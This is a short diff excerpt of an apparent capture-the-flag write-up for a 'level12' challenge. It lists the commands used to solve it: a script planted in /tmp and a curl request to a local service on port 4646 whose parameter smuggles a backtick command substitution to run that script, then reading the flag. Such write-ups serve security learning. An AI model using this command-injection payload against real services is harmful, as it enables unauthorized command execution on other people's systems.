@@ -15,5 +15,6 @@ the commands we need to do are :
 echo 'getflag > /tmp/flag' > /tmp/RUNME
 chmod +x /tmp/RUNME
 curl localhost:4646/x=\``/*/RUNME\`
-cat /tmp/flag
+then
+`cat /tmp/flag`
 we can log as level13
